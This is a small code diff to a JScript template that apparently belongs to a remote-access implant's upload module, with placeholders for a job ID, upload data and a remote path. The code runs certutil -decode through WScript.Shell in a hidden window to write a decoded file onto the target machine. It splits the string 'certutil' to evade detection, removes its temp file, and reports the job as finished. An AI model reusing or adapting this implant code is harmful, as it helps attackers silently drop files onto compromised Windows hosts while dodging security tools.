@@ -30,7 +30,7 @@ deleteFile = function (pathname) {
 
 try {
     tempout = writeTempFile("~UPLOAD_DATA~");    
-    r = new ActiveXObject("WScript.Shell").Run("certut" + "il -decode " + tempout + " ~PATH_FILE~ ", 0, true);
+    r = new ActiveXObject("WScript.Shell").Run("certut" + "il -decode " + tempout + " ~REMOTE_PATHNAME~ ", 0, true);
     deleteFile(tempout);
     c = "~JOB_ID~" + "|" + "[upload finish]";
 }
